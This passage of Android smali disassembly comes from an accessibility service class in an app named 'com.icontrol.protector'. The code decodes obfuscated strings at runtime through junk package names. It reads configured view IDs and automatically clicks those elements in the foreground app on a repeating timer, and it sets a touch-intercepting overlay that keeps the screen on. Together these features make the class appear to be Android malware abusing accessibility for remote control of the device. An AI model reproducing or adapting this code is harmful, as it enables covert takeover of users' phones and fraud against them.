    sput-object v0, Lcom/icontrol/protector/AccessServices;->s:Landroid/view/View;

    invoke-virtual {v0, v5}, Landroid/view/View;->setKeepScreenOn(Z)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    :try_start_6
    sget-object v0, Lcom/icontrol/protector/AccessServices;->s:Landroid/view/View;

    new-instance v2, Lcom/icontrol/protector/AccessServices$l;

    invoke-direct {v2, v1}, Lcom/icontrol/protector/AccessServices$l;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-virtual {v0, v2}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    goto :goto_a

    :catch_6
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_a
    return-void

    :array_0
    .array-data 1
        0x78t
        -0x5at
        -0xft
        -0x1ct
        0x60t
        -0x6ft
        -0x29t
        -0x58t
    .end array-data

    :array_1
    .array-data 1
        0x17t
        -0x38t
        -0x6et
        -0x45t
        0x2t
        -0x1bt
        -0x5bt
        -0x2ft
    .end array-data

    :array_2
    .array-data 1
        -0x7t
        -0x8t
        0x4ct
        -0x13t
        0x73t
        -0x5bt
        0x2at
        0x2t
    .end array-data

    :array_3
    .array-data 1
        -0x49t
        -0x49t
        0x13t
        -0x43t
        0x3ct
        -0xbt
        0x7ft
        0x52t
    .end array-data

    :array_4
    .array-data 1
        0x2ft
        0x38t
        -0x57t
        0x46t
        -0x7at
        -0x23t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x74t
        0x64t
        -0xet
        0x1at
        -0x25t
        -0x80t
        -0x6ct
        0x10t
    .end array-data

    :array_6
    .array-data 1
        0x30t
        -0x4bt
        -0x6ft
        -0x54t
        -0x4ft
    .end array-data

    nop

    :array_7
    .array-data 1
        0x40t
        -0x26t
        -0x1at
        -0x37t
        -0x3dt
        0x1et
        0x1et
        -0x7t
    .end array-data

    :array_8
    .array-data 1
        0x5ft
        0x22t
        0x4ft
        0x28t
        -0x65t
        -0x3ft
        0x9t
        0x54t
        0x49t
        0x20t
        0x47t
        0x28t
    .end array-data

    :array_9
    .array-data 1
        0x1et
        0x41t
        0x2ct
        0x4dt
        -0x18t
        -0x4et
        0x33t
        0x6et
    .end array-data

    :array_a
    .array-data 1
        -0x4at
        0x7et
        -0x7dt
        -0x9t
    .end array-data

    :array_b
    .array-data 1
        -0x3ft
        0x17t
        -0x1bt
        -0x62t
        -0x2ct
        -0x15t
        0x5t
        -0x42t
    .end array-data

    :array_c
    .array-data 1
        -0x45t
        0x33t
        -0x3ct
        -0x5dt
        -0x5at
        -0x19t
        0x1dt
        -0x1dt
        -0x67t
        0x29t
        -0x8t
    .end array-data

    :array_d
    .array-data 1
        -0xat
        0x4at
        -0x6dt
        -0x36t
        -0x40t
        -0x72t
        0x27t
        -0x51t
    .end array-data

    :array_e
    .array-data 1
        0x43t
        0x2at
        0x17t
        -0x2t
        -0x75t
        -0x4at
        0x7et
        0x57t
    .end array-data

    :array_f
    .array-data 1
        -0xet
        0x8t
        -0x11t
        -0x4et
        -0x1at
        -0x68t
    .end array-data

    nop

    :array_10
    .array-data 1
        -0x69t
        0x65t
        -0x61t
        -0x3at
        -0x61t
        -0x1ct
        0x33t
        0x33t
    .end array-data

    :array_11
    .array-data 1
        -0x3at
        0x23t
    .end array-data

    nop

    :array_12
    .array-data 1
        -0x66t
        0x5ft
        -0x37t
        -0x9t
        -0x3bt
        0x5ft
        0x22t
        0x66t
    .end array-data

    :array_13
    .array-data 1
        -0x72t
        0x73t
        0x6at
        0x13t
        0x4et
    .end array-data

    nop

    :array_14
    .array-data 1
        -0x25t
        0x27t
        0x2ct
        0x3et
        0x76t
        0x8t
        0x34t
        0x1et
    .end array-data

    :array_15
    .array-data 1
        0x54t
        0x72t
        0x0t
        -0x5at
        -0x17t
    .end array-data

    nop

    :array_16
    .array-data 1
        0xft
        0x4et
        0x73t
        -0x68t
        -0x4ct
        -0x2t
        0x3t
        -0x22t
    .end array-data

    :array_17
    .array-data 1
        -0x51t
        0x6et
        -0x6at
        0x1at
        -0x9t
        -0x8t
        0x1at
    .end array-data

    :array_18
    .array-data 1
        -0xdt
        0x35t
        -0x56t
        0x69t
        -0x37t
        -0x5ct
        0x47t
        -0x65t
    .end array-data

    :array_19
    .array-data 1
        -0x35t
        -0x6bt
        0x44t
        0x30t
    .end array-data

    :array_1a
    .array-data 1
        -0x64t
        -0x1at
        0x27t
        0x42t
        0x19t
        0x23t
        0x4at
        -0x50t
    .end array-data

    :array_1b
    .array-data 1
        0x7et
        0x3at
        -0x76t
    .end array-data

    :array_1c
    .array-data 1
        0x49t
        0x8t
        -0x46t
        -0x56t
        0x56t
        -0x2et
        0x42t
        0x72t
    .end array-data

    :array_1d
    .array-data 1
        -0x70t
        -0x50t
        0x3bt
        -0x15t
    .end array-data

    :array_1e
    .array-data 1
        -0x28t
        -0x3dt
        0x58t
        -0x67t
        -0x1ft
        0x4bt
        -0x2t
        -0x51t
    .end array-data

    :array_1f
    .array-data 1
        -0x34t
        0x42t
        -0x5ft
        0x5ct
    .end array-data

    :array_20
    .array-data 1
        -0x3t
        0x70t
        -0x67t
        0x6ct
        -0x36t
        -0x80t
        0x70t
        0x53t
    .end array-data

    :array_21
    .array-data 1
        -0x4at
        0x3ft
        -0x56t
        0x13t
        -0x47t
        -0x7at
    .end array-data

    nop

    :array_22
    .array-data 1
        -0x3ft
        0x56t
        -0x3ct
        0x77t
        -0x2at
        -0xft
        0x22t
        -0x28t
    .end array-data

    :array_23
    .array-data 1
        0x6ft
        -0x6dt
        -0xdt
        -0x13t
        -0x2dt
        -0x33t
        0x47t
    .end array-data

    :array_24
    .array-data 1
        0x4ct
        -0x2bt
        -0x4bt
        -0x28t
        -0x1ct
        -0x1t
        0x75t
        0x1ft
    .end array-data

    :array_25
    .array-data 1
        0x1at
        -0xet
        0x3dt
        -0x5dt
        0x5dt
        0x29t
        0x42t
    .end array-data

    :array_26
    .array-data 1
        0x39t
        -0x4ct
        0x7bt
        -0x20t
        0x6ct
        0x19t
        0x75t
        0x4ct
    .end array-data

    :array_27
    .array-data 1
        -0x35t
        0x41t
        -0x80t
        0x2et
        -0x19t
        0x2t
        0x4et
    .end array-data

    :array_28
    .array-data 1
        -0x18t
        0x75t
        -0x3dt
        0x6ft
        -0x5ft
        0x37t
        0x7et
        -0x33t
    .end array-data

    :array_29
    .array-data 1
        -0xdt
        -0x3at
        0x4ft
        -0x3et
        -0x49t
        -0x3at
        -0x54t
    .end array-data

    :array_2a
    .array-data 1
        -0x30t
        -0x7dt
        0x7ft
        -0x79t
        -0x79t
        -0x7dt
        -0x64t
        -0x14t
    .end array-data

    :array_2b
    .array-data 1
        -0x25t
        0x23t
        -0x31t
        -0x5dt
        0xat
        0x7t
        0x7at
    .end array-data

    :array_2c
    .array-data 1
        -0x47t
        0x4ft
        -0x52t
        -0x40t
        0x61t
        0x72t
        0x13t
        -0x1ct
    .end array-data

    :array_2d
    .array-data 1
        0x47t
        0x0t
        0x7at
        0x60t
        0x5bt
        -0x21t
        -0xct
        0x66t
    .end array-data

    :array_2e
    .array-data 1
        0x23t
        0x72t
        0x1bt
        0x17t
        0x3at
        -0x43t
        -0x68t
        0x3t
    .end array-data

    :array_2f
    .array-data 1
        0x35t
        -0x6et
        -0x64t
        -0x77t
        -0x3t
        -0x64t
        0x68t
    .end array-data

    :array_30
    .array-data 1
        0x16t
        -0x5et
        -0x54t
        -0x47t
        -0x33t
        -0x54t
        0x58t
        0x38t
    .end array-data

    :array_31
    .array-data 1
        0x7t
        -0x33t
        -0x5at
        0x15t
        -0x7et
        -0x67t
        0x7bt
    .end array-data

    :array_32
    .array-data 1
        0x24t
        -0x3t
        -0x6at
        0x25t
        -0x4et
        -0x57t
        0x4bt
        0x3t
    .end array-data

    :array_33
    .array-data 1
        0x1dt
        0x4dt
        -0x3dt
        -0x31t
        0x13t
        -0x42t
        -0x2ft
        0x4at
    .end array-data

    :array_34
    .array-data 1
        0x72t
        0x23t
        -0x60t
        -0x70t
        0x71t
        -0x36t
        -0x5dt
        0x33t
    .end array-data

    :array_35
    .array-data 1
        -0x3ft
        -0x16t
        -0x2dt
        -0x5bt
        0xdt
        0x29t
    .end array-data

    nop

    :array_36
    .array-data 1
        -0x4at
        -0x7dt
        -0x43t
        -0x3ft
        0x62t
        0x5et
        0x65t
        -0x76t
    .end array-data
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    invoke-direct {p0}, Lcom/icontrol/protector/AccessServices;->w()V

    const/4 p1, 0x1

    return p1
.end method

.method public q()V
    .locals 14

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/icontrol/protector/i;->b:Z

    sget-object v1, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v2, 0x4

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const-string v5, ""

    invoke-static {v1, v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v3

    const/4 v6, 0x3

    if-eq v3, v0, :cond_8

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v3

    const/16 v7, 0xe

    if-ne v3, v7, :cond_0

    goto/16 :goto_7

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v3

    const-wide/16 v7, 0x64

    const/16 v9, 0x10

    const-wide/16 v10, 0x1f4

    const/4 v12, 0x2

    const/4 v13, 0x0

    if-ne v3, v12, :cond_2

    sget-object v2, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v2}, Lcom/icontrol/protector/a;->N(Ljava/lang/String;)V

    :try_start_0
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_a

    new-array v2, v0, [B

    const/16 v3, 0x6f

    aput-byte v3, v2, v13

    new-array v3, v4, [B

    fill-array-data v3, :array_2

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    new-array v0, v0, [B

    const/16 v2, -0x26

    aput-byte v2, v0, v13

    new-array v2, v4, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-array v1, v12, [B

    fill-array-data v1, :array_4

    new-array v2, v4, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    array-length v1, v0

    move v2, v13

    :goto_0
    if-ge v2, v1, :cond_a

    aget-object v3, v0, v2

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    invoke-virtual {v4, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_1

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_1

    invoke-interface {v3, v13}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :try_start_1
    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception v3

    invoke-virtual {v3}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :goto_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :cond_2
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v3

    if-ne v3, v6, :cond_3

    sget-object v0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v0}, Lcom/icontrol/protector/a;->N(Ljava/lang/String;)V

    :try_start_2
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    :goto_2
    invoke-static {}, Lcom/icontrol/protector/a;->j()V

    goto/16 :goto_8

    :catch_2
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :cond_3
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v3

    if-ne v3, v2, :cond_5

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_a

    new-array v2, v0, [B

    aput-byte v6, v2, v13

    new-array v3, v4, [B

    fill-array-data v3, :array_6

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    new-array v0, v0, [B

    const/16 v2, -0x59

    aput-byte v2, v0, v13

    new-array v2, v4, [B

    fill-array-data v2, :array_7

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-array v1, v12, [B

    fill-array-data v1, :array_8

    new-array v2, v4, [B

    fill-array-data v2, :array_9

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    array-length v1, v0

    move v2, v13

    :goto_3
    if-ge v2, v1, :cond_a

    aget-object v3, v0, v2

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    invoke-virtual {v4, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_4

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_4

    invoke-interface {v3, v13}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :try_start_3
    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_4

    :catch_3
    move-exception v3

    invoke-virtual {v3}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_4
    :goto_4
    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    :cond_5
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_7

    new-array v2, v0, [B

    const/4 v3, 0x5

    aput-byte v3, v2, v13

    new-array v3, v4, [B

    fill-array-data v3, :array_a

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    new-array v0, v0, [B

    aput-byte v13, v0, v13

    new-array v2, v4, [B

    fill-array-data v2, :array_b

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-array v1, v12, [B

    fill-array-data v1, :array_c

    new-array v2, v4, [B

    fill-array-data v2, :array_d

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    array-length v1, v0

    move v2, v13

    :goto_5
    if-ge v2, v1, :cond_7

    aget-object v3, v0, v2

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    invoke-virtual {v4, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_6

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_6

    invoke-interface {v3, v13}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :try_start_4
    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_6

    :catch_4
    move-exception v3

    invoke-virtual {v3}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_6
    :goto_6
    add-int/lit8 v2, v2, 0x1

    goto :goto_5

    :cond_7
    const-wide/16 v0, 0xc8

    :try_start_5
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_6

    sget-object v0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v0}, Lcom/icontrol/protector/a;->N(Ljava/lang/String;)V

    :try_start_6
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/InterruptedException; {:try_start_6 .. :try_end_6} :catch_5

    goto/16 :goto_2

    :catch_5
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_6
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :cond_8
    :goto_7
    new-array v0, v6, [B

    fill-array-data v0, :array_e

    new-array v1, v4, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v6, [B

    fill-array-data v1, :array_10

    new-array v2, v4, [B

    fill-array-data v2, :array_11

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    :cond_9
    sget-object v0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v0}, Lcom/icontrol/protector/a;->l(Ljava/lang/String;)V

    :cond_a
    :goto_8
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/icontrol/protector/AccessServices$i;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/AccessServices$i;-><init>(Lcom/icontrol/protector/AccessServices;)V

    const-wide/16 v2, 0x1388

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    nop

    :array_0
    .array-data 1
        -0x29t
        0x2ft
        -0x41t
        0x2at
    .end array-data

    :array_1
    .array-data 1
        -0x41t
        0x56t
        -0x31t
        0x4et
        -0xat
        -0xet
        -0x1et
        0x21t
    .end array-data

    :array_2
    .array-data 1
        0x34t
        -0x76t
        0x1ft
        -0x70t
        -0x3ft
        0x1ft
        -0x5ft
        -0x22t
    .end array-data

    :array_3
    .array-data 1
        -0x79t
        0x3et
        -0x4ct
        0x29t
        0x1et
        0x59t
        -0x12t
        -0x58t
    .end array-data

    :array_4
    .array-data 1
        -0x70t
        0x73t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x44t
        0x53t
        0x6dt
        0x6bt
        -0x74t
        0x36t
        0x47t
        -0x22t
    .end array-data

    :array_6
    .array-data 1
        0x58t
        -0x24t
        -0x18t
        -0x5et
        -0x45t
        -0x7ft
        0x42t
        0x3t
    .end array-data

    :array_7
    .array-data 1
        -0x6t
        -0x53t
        0x63t
        -0x7ct
        -0x5bt
        0x4at
        -0x6dt
        0x68t
    .end array-data

    :array_8
    .array-data 1
        -0x3ct
        0x79t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x18t
        0x59t
        0x53t
        0x36t
        -0x26t
        0x23t
        -0x44t
        0x14t
    .end array-data

    :array_a
    .array-data 1
        0x5et
        -0x43t
        0x2dt
        0x72t
        -0x7et
        -0x4et
        0x56t
        0x41t
    .end array-data

    :array_b
    .array-data 1
        0x5dt
        -0x3dt
        -0x1et
        -0x3bt
        -0x8t
        0x45t
        0x4dt
        -0x43t
    .end array-data

    :array_c
    .array-data 1
        0xbt
        0x20t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x27t
        0x0t
        -0x40t
        0x57t
        0x1at
        0x7dt
        0x3ft
        -0x6at
    .end array-data

    :array_e
    .array-data 1
        -0x1ft
        -0x14t
        0x6bt
    .end array-data

    :array_f
    .array-data 1
        -0x77t
        -0x6bt
        0x1bt
        -0xbt
        -0x4ft
        0x5ft
        -0x76t
        -0x10t
    .end array-data

    :array_10
    .array-data 1
        0x55t
        0x7ft
        -0x7ft
    .end array-data

    :array_11
    .array-data 1
        0x3dt
        0x6t
        -0xft
        0x7at
        0x24t
        0x6et
        0x77t
        0x48t
    .end array-data
.end method

.method public takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/accessibilityservice/AccessibilityService;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    return-void
.end method

.method public takeScreenshotOfWindow(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/accessibilityservice/AccessibilityService;->takeScreenshotOfWindow(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    return-void
.end method
